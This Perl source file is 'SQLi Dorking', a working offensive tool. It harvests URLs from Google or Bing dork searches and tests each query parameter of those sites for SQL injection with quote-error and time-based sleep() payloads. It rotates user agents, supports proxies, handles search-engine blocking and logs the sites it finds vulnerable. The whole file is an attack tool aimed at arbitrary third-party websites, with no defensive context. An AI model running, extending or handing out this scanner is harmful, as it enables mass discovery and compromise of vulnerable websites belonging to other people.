#!/usr/bin/perl
 
#################################
#    SQLi Dorking v1.2.1        #
#    Autor: Crozz Cyborg        #
#                               #
#  Copyright 2013 Crozz Cyborg  #
#########################################################################
#  This program is free software; you can redistribute it and/or modify #
#  it under the terms of the GNU General Public License as published by #
#  the Free Software Foundation; either version 2 of the License, or    #
#  (at your option) any later version.                                  #
#                                                                       #
#  This program is distributed in the hope that it will be useful,      #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of       #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        #
#  GNU General Public License for more details.                         #
#                                                                       #
#  You should have received a copy of the GNU General Public License    #
#  along with this program; if not, write to the Free Software          #
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,           #
#  MA 02110-1301, USA.                                                  #
#########################################################################
# English translation and a few more examples by @Dwek__                #
#########################################################################
 
use strict;
 
$| = 1;
$SIG{'INT'} = \&Interrupt;
 
# Modulos/Librerias
use HTTP::Request;
use LWP::UserAgent;
 
use Benchmark;
use POSIX;
use threads;
use Time::HiRes "usleep";

my ($lang, %Lang, @en, @es);

$ENV{'LANG'} =~ /^(\w*)_.*$/;
if($1 eq 'es'){
	$lang = 'es';
}
elsif($1 eq 'en'){
	$lang = 'en';
}
else{
	$lang = 'en';
}

@en = (
	'Use googleDork',
	'Use bingDork',
	'Specify List of Dork links',
	'Specify Page',
	'Save Results To File',
	'Use Proxy',
	'detected traffic "unusual" the IP',
	'change it to continue [(C)hange a Bing/(Q)remove/Continue[Enter]]',
	'Continue...',
	'Scanning Completed',
	'vulnerabilities',
	'Can not write to file',
	'Specify another file:',
	"\n\n1) Change proxy\n2) Change dork\n3) Leave\n\n\$> ",
	'New proxy',
	'New dork',
	'Finish',
	'Invalid option',
	'Getting links...',
	'You can only use one search engine at a time!',
	'Scanning',
	'There are no vulnerablies'
);

@es = (
	'No se especifico una googleDork',
	'No se especifico una bingDork',
	'No se especifico la lista',
	'No se especifico un numero de pagina',
	'No se especifico un archivo',
	'No se especifico un proxy',
	'Detectado trafico "inusual" de la IP',
	'cambiala para continuar [(C)ambiar a Bing/(Q)uitar/Continuar[Enter]]',
	'Continuando...',
	'Escaneo finalizado con',
	'vulnerables',
	'No se puede escribir en el archivo',
	'Especifica otro archivo:',
	"\n\n1) Cambiar proxy\n2) Cambiar dork\n3) Salir\n\n\$> ",
	'Nuevo proxy:',
	'Nueva dork:',
	'Finalizar',
	'Opcion invalida',
	'Obteniendo links...',
	'Solamente puedes usar un buscador!',
	'Escaneando',
	'No se encontraron paginas vulnerables'
);


%Lang = (
	'es' => \@es,
	'en' => \@en
);

my @UserAgents = (
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0',
'Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20130405 Firefox/22.0',
'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)',
'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',
'Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14',
'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14');
  
our ($Dork,$BingDork,$List,$NumPages,$FileLinks,$Proxy);
my @ProTime;
 
sub GetOptions(){
    for(my $i = 0;$i <= $#ARGV;$i++){
        if($ARGV[$i] eq '-h' || $ARGV[$i] eq '--help'){
            Uso()
        }
        elsif($ARGV[$i] eq '-gd' || $ARGV[$i] eq '--google'){
            $i++;
            if($i > $#ARGV){
                &Uso("$Lang{$lang}[0]\n");
            }
            $Dork = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-bd' || $ARGV[$i] eq '--bing'){
            $i++;
            if($i > $#ARGV){
                &Uso("$Lang{$lang}[1]\n");
            }
            $BingDork = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-l'  || $ARGV[$i] eq '--list'){
            $i++;
            if($i > $#ARGV){
                &Uso("$Lang{$lang}[2]\n");
            }
            $List = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-p'  || $ARGV[$i] eq '--pages'){
            $i++;
            if($i > $#ARGV){
                &Uso("$Lang{$lang}[3]\n");
            }
            $NumPages = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '-f'  || $ARGV[$i] eq '--file'){
            $i++;
            if($i > $#ARGV){
                &Uso("$Lang{$lang}[4]\n");
            }
            $FileLinks = $ARGV[$i];
        }
        elsif($ARGV[$i] eq '--proxy'){
            $i++;
            if($i > $#ARGV){
                &Uso("$Lang{$lang}[5]\n");
            }
            $Proxy = $ARGV[$i];
        }
    }
}
 
sub Uso(){
    print $_[0] if $_[0];
 
if($lang eq 'es'){
    die <<EOTXT;
\rUso: $0 [-gd/bd <dork>] [-p <paginas>] [-l archivo.txt]  [-f archivo]
  -gd <Dork>
      Google Dork
  -bd <Bing>
      Bing Dork
  -p <paginas>
      Numero de paginas para buscar

  -l <Archivo>
      Archivo con links para analizar
  -f <archivo>
      Archivo donde se guardaran los logs

Ejemplo: $0 -bd inurl:product.php?id= -p 3

Mas informacion escribe: perldoc $0
EOTXT

}
else{
    die <<EOTXT;
\rUse: $0 [-gd/bd <dork>] [-p <pages>] [-l links.txt]  [-f pages_found]
  -gd <Dork>
      Google Dork Search
  -bd <Bing>
      Bing Dork Search
  -p <page>
      Number of Result Pages To Search Through
  -l <links.txt>
      Specify List of pages to Dork - one per line
  -f <pages_found>
      Pages Found Log
  --proxy <proxy>
      Specify a Proxy Server
 
Example: $0 -bd inurl:product.php?id= -p 3
 
Additional examples: perldoc $0
EOTXT
}
}
 
# INI Functions
 
sub LinksByDork(){
    my @Links;
    my $Pages = $Dork ? 0 : 1;
    my ($carga,$porcentaje) = ("",0);
 
    print "Dork: $Dork$BingDork\n";
 
    $BingDork =~ s/ /\+/g;$Dork =~ s/ /\+/g;
    $BingDork =~ s/([^\+A-Za-z0-9\-\._~])/sprintf("%%%02X",ord($1))/eg;$Dork =~ s/([^\+A-Za-z0-9\-\._~])/sprintf("%%%02X",ord($1))/eg;
 
    foreach(my $pag = 0;$pag <= $NumPages;$pag++){
        my ($HTML,$Link,@Data);
 
        printf("\r[%-50s] %3i%%",$carga,$porcentaje < 100 ? ceil($porcentaje) : floor($porcentaje));
        $porcentaje += (100/$NumPages);
        $carga = "=" x ($porcentaje < 100 ? ceil($porcentaje)/2 : floor($porcentaje)/2);
 
        if($Dork){
            my @Nav = &Navegar('http://www.google.com/search?q='.$Dork.'&start='.$Pages);
            $HTML = $Nav[4];
            push(@ProTime,$Nav[3]);
        }
        elsif($BingDork){
            my @Nav = &Navegar('http://www.bing.com/search?q='.$BingDork.'&first='.$Pages);
            $HTML = $Nav[4];
            push(@ProTime,$Nav[3]);
        }
 
        if($HTML =~ m/Our systems have detected unusual traffic from your computer/i){
            $HTML =~ /IP address\: (\S+)\<br/i;
            print "\r$Lang{$lang}[6] $1\n$Lang{$lang}[7] ";
            chomp(my $CQ = <STDIN>);
 
            if($CQ =~ /^q$/i){
                if($#Links > 0){
                    @Links = &EliminarRep(@Links);
                    return @Links
                }else{exit}
            }
            elsif($CQ =~ /^c$/i){
                $BingDork = $Dork;
                $Dork = 0;
                $Pages += 1;
                my @Nav = &Navegar('http://www.bing.com/search?q='.$BingDork.'&first='.$Pages);
                $HTML = $Nav[3];
            }
            else{
                print "$Lang{$lang}[8]\n";
                $pag--;next
            }
        }
 
        if($Dork){
            @Data = $HTML =~ m/href="\/url\?q=(\S+)">/gi;
        }
        elsif($BingDork){
            @Data = $HTML =~ /<h3><a href="([-.:%?=&\/\w]+)"/mgi;
        }
 
        if($#Data <= 0){
            printf("\r[%-50s] %3i%%","=" x 50,100);last
        }
 
        foreach $Link(@Data){
            if($Link !~ m/google.com/i && $Link !~ m/googleusercontent.com/i && $Link !~ m/msn.com/i && ($Link =~ m/\%3f\S+%3d\S+/i || $Link =~ /\?\S+=\S+/)){
                $Link =~ s/\&amp\;/\&/g;
                $Link =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
                $Link =~ s/^https:\/\//http:\/\//g;
 
                push(@Links,$Link);
            }
        }
        $Pages += 10;
    }
 
    print "\n\n";
 
    @Links = &EliminarRep(@Links);
 
    return @Links
}
 
sub LinksByList(){
    my @Links;
    $NumPages = 10;
 
    open(LIST,"$List");
 
    while(<LIST>){
        chomp;
 
        foreach my $search(("","inurl:php?id=")){
            $Dork = "site:$_ $search";
            push(@Links,LinksByDork());
            last if $#Links > 0;
        }
    }
 
    close(LIST);
 
    return @Links
}
 
sub Navegar(){
    my $URL      = $_[0];
    my $TimeOut  = $_[1];
 
    my $Data = '';
    my @time;
 
    my ($UA,$Req,$Resp,$Contenido);
 
    $UA = LWP::UserAgent->new;
    $UA->agent($UserAgents[int(rand($#UserAgents+1))]);
 
    $URL =~ /^http\:\/\/([\w\.]+)\/*/;
    $UA->default_header('Host' => $1);
    $UA->default_header('Accept' => 'text/html');
    $UA->default_header('Accept-Language' => 'en-US,en;q=0.5');
    $UA->default_header('DNT' => '1');
    $UA->default_header('Connection' => 'close');
 
    eval {
        local $SIG{'ALRM'} = sub { die "TimeOut" };
        alarm $TimeOut;
 
        $time[0] = new Benchmark;
 
        $Req = HTTP::Request->new(GET => $URL);
        $Resp = $UA->request($Req);
 
        $time[1] = new Benchmark;
        $time[2] = ${timediff($time[1],$time[0])}[0];
        alarm 0;
    };
    
 
    alarm 0;
 
    return(0,"Time Out") if($@ && $@ =~ /TimeOut/);
    return(0,"Fail")     unless($Resp->is_success);
 
    my @Return = (1,"20x OK",0,"$time[2].0",0);
 
#   $Return[2] = $1 if($Data =~ m[Server\: (.+)\r\n]);
    $Return[4] = $Resp->content();
 
    return @Return;
}
 
sub SQL(){
    my $Link = $_[0];
 
    my $LinkMod;
    my @HTML = (0) x 3;
 
    my @Edit      = split('\?',$Link);
    my @Variables = split('&',$Edit[1]);
    my %Vars      = map {split('=',$_)} @Variables;
 
    foreach my $Var(keys %Vars){
        $LinkMod = &ModLink($Edit[0],\@Variables,$Var," '");
 
        my @Nav = &Navegar($LinkMod);
        unless($Nav[0]){ return 0 }
        else{ $HTML[0] = $Nav[4] }
 
        my $time3 = $Nav[3];
 
        if($HTML[0] =~ m/You have an error in your SQL syntax/i){
            my @Ret = ($Link,$Var," '",$time3);
            return \@Ret;
        }
        elsif($HTML[0] =~ m/Supplied argument is not a valid MySQL/i){
            my @Ret = ($Link,$Var," '",$time3);
            return \@Ret;
        }
 
        my ($tmp,$aumento);
        $tmp += $_ foreach(@ProTime);
        $tmp = int($tmp/($#ProTime+1));
        $aumento = $time3 >= ($tmp+3) ? 10 : 5;
 
        foreach my $payload(("' and sleep(".($time3+$aumento).") and '1' = '1"," and sleep(".($time3+$aumento).") and 1 = 1")){
            $LinkMod = &ModLink($Edit[0],\@Variables,$Var,$payload);
 
            my @Nav = &Navegar($LinkMod);
            unless($Nav[0]){ next }
            else{ $HTML[0] = $Nav[4] }
 
            my $timedif = $Nav[3];
 
            if($timedif >= ($time3+$aumento)){
                my @Ret = ($Link,$Var,$payload,$timedif);
                return \@Ret;
            }
        }
    }
    return 0
}
 
sub ModLink(){
    my $Host      = $_[0];
    my @Variables = @{$_[1]};
    my $Var       = $_[2];
    my $Code      = $_[3];
 
    my %Vars = map {split('=',$_)} @Variables;
 
    my $LinkMod = $Host.'?';
 
    foreach (keys %Vars){
        if($Var eq $_){$LinkMod .= "$_=".$Vars{$_}." $Code&";}
        else{$LinkMod .= "$_=".$Vars{$_}."&";}
    }
    chop($LinkMod);
    return $LinkMod;
}
 
sub EliminarRep(){
    my @Links = @_;
    my @HP1;
    my @HP2;
 
    for(my $i = 0;$i <= $#Links;$i++){
        @HP1 = split('\?',$Links[$i]);
        for(my $x = $i;$x <= $#Links;$x++){
            @HP2 = split('\?',$Links[$x]);
            if($i != $x && $HP1[0] eq $HP2[0]){
                splice(@Links,$x,1);
                $x-- if $x != 0;
            }
        }
    }
 
    return @Links;
}
 
sub Show(){
    my @LinkSQLi = @{$_[1]};
    my @t = @{$_[0]};
    my @c = ("\e[0;32m","\e[1;32m");
    my $nc = 0;
 
    if($^O eq "linux"){
        printf("\n" x 5);
        printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
        printf("|\e[0;33mLink%s\e[0m|\e[0;33mVar%s\e[0m|\e[0;33mPayload%s\e[0m|\n"," " x ($t[0]-4)," " x ($t[1]-3)," " x ($t[2]-7));
        printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
        foreach my $l(@LinkSQLi){
            printf("|$c[$nc % 2]%-${t[0]}s\e[0m|$c[$nc % 2]%-${t[1]}s\e[0m|$c[$nc % 2]%-${t[2]}s\e[0m|\n",$$l[0],$$l[1],$$l[2]);
            $nc++;
        }
        printf("+%s+%s+%s+\n","-" x ($t[0]),"-" x ($t[1]),"-" x ($t[2]));
        system("notify-send \"SQLi Dorking\" \"$Lang{$lang}[9] ".($#LinkSQLi+1)." $Lang{$lang}[10]\" -t 10000");
    }
    else{
        printf("\n" x 5);
        printf("+%s+\n","-" x ($t[0]));
        printf("|Link%s|\n"," " x ($t[0]-4));
        printf("+%s+\n","-" x ($t[0]));
        foreach my $l(@LinkSQLi){
            printf("|%-${t[0]}s|\n",$$l[0]);
        }
        printf("+%s+\n","-" x ($t[0]));
    }
 
    if($^O eq "MSWin32"){
        system("msgbox * \"$Lang{$lang}[9] ".($#LinkSQLi+1)." $Lang{$lang}[10]\"");
    }
}
 
sub Logs(){
    if(open(LOGS,">>${$_[0]}")){
        print LOGS "$_[1]\n";
        close(LOGS);
    }
    else{
        print "$Lang{$lang}[11] '${$_[0]}' $!";
        print "$Lang{$lang}[12] ";
        chomp(${$_[0]} = <STDIN>);
    }
}
 
sub Interrupt(){
    print $Lang{$lang}[13];
    chomp(my $resp = <STDIN>);
 
    if($resp == 1){print "$Lang{$lang}[14]";chomp($Proxy = <STDIN>)}
    elsif($resp == 2){print "$Lang{$lang}[15]";chomp($Dork = <STDIN>)}
    elsif($resp == 3){print "$Lang{$lang}[16]\n";exit}
    else{print "$Lang{$lang}[17]\n";}
}
 
# End Functions
 
sub main(){
    my @Links;
 
    my @LinkSQLi;
    my @t = (4,8,10);
 
    GetOptions();
 
    print "$Lang{$lang}[18]";
 
    if($Dork){
        Uso() unless $NumPages;
        if($BingDork){
            print "\r$Lang{$lang}[19]\n";
            Uso();
        }
        print "\n";push(@Links,LinksByDork());
    }
    elsif($BingDork){
        Uso() unless $NumPages;
        if($Dork){
            print "\r$Lang{$lang}[19]\n";
            Uso();
        }
        print "\n";push(@Links,LinksByDork());
    }
    elsif($List){ print "\n";push(@Links,LinksByList()) }
    else{ Uso }
 
    print "$Lang{$lang}[20] ".($#Links+1)." links...\n" if $#Links > 0;
 
    foreach(@Links){
        my $thr1 = threads->create(\&SQL,$_);
 
        while($thr1->is_running()){
            for(("/","-","\\","|")){
                print $_;
                usleep(80_000);
                print "\b";
            }
        }
 
        my $Datos = $thr1->join();
 
        if($Datos){
            foreach(0..2){
                $t[$_] = length($$Datos[$_]) if($t[$_] < length($$Datos[$_]));
            }
            printf("\bLink: %s Var: %s Payload: %s Time: %s\n",$$Datos[0],$$Datos[1],$$Datos[2],$$Datos[3]);
            &Logs(\$FileLinks,"Link: $$Datos[0] Var: $$Datos[1] Payload: $$Datos[2]") if $FileLinks;
            push(@LinkSQLi,$Datos);
        }
    }
 
    if(@LinkSQLi){ &Show(\@t,\@LinkSQLi) }
    else{ print "$Lang{$lang}[21]\n" }
}
 
main();
 
__END__
 
=head1 Name
 
SQLi Dorking
 
=head1 Version
 
Version: 1.2.1 Beta
 
=head1 Author
 
Crozz Cyborg
 
=head1 Description
 
Find pages vulnerable to SQL Vulnerabilities using Dorks
 
=head1 Use
 
sqliDorking.pl [-gd/bd <dork>] [-p <pages>] [-l <links.txt>]  [-f <pages_found>]
 
=head2 Options
 
  -gd <Dork>
      Google Dork Search - Specify the string to find
  -bd <Bing>
      Bing Dork Search - Specify the string to find
  -p <pages>
      Number of Result Pages To Search Through
  -l <links.txt>
      Specify List of pages to Dork - one per line
  -f <pages_found>
      Vulnerable Pages Output Log
  --proxy <proxy>
      Specify a Proxy Server
 
=head2 Use Examples
 
sqliDorking.pl -gd inurl:product.php?id= -p 3 -f VulneSQL.txt
 
sqliDorking.pl -l links.txt -f VulneSQL.txt
 
sqliDorking.pl -bd inurl:product.php?id= -p 3
 
sqliDorking.pl -l links.txt
 
sqliDorking.pl -bd inurl:opinions.php?id= -p 10 -f VulneSQL.txt
 
 
=head2 Domains and/or links to test: Links.txt
 
Links.txt file can have any name, but it's format must have one domain name per line, eg 
domain: paginaConSQL.org
 
Pressing Control C during operation will provide the following options.
    1) Change proxy
    2) Change dork
    3) Leave
